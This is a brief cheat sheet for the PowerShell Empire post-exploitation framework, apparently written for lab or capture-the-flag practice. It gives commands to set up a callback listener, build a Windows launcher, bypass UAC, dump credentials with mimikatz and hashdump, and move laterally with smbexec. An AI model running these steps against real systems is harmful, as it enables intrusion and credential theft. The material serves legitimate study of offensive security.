# Empire

### To create a listener

```bash
listeners
```

```bash
uselistener http
```

```bash
set Host 10.11.0.4b
```

```bash
set Name <name_of_listener>
```

```bash
execute
```

```bash
back
```

### To create a launcher

```bash
usestager windows/launcher_bat
```

```bash
set Listener <name_of_listener>
```

```bash
execute
```

### List all available modules

```bash
usemodule [tab][tab]
```

{% hint style="info" %}
The bypassuac\_fodhelper module is quite useful if we have access to a local administrator account. Depending on the local Windows version, this module can bypass UAC and launch a high-integrity PowerShell Empire agent.
{% endhint %}

### Display info abt the module

```bash
info
```

{% hint style="info" %}
If the NeedsAdmin field is set to "True", the script requires local Administrator permissions.
{% endhint %}

{% hint style="info" %}
If the OpsecSafe field is set to "True", the script will avoid leaving behind indicators of compromise, such as temporary disk files or new user accounts.
{% endhint %}

### To see all agents

```bash
agents
```

### Interacting with a particular agent

```bash
interact K678VC13
```

```bash
shell cat /root/flag.txt
```

### Obtaining password hashes

#### Windows:

```bash
usemodule credentials/mimikatz/logonpasswords
```

#### Linux:

```bash
usemodule  collection/linux/hashdump*
```

```bash
execute
```

### To see extracted credentials

```bash
creds
```

### Lateral Movement

```bash
usemodule lateral_movement/invoke_smbexec
```

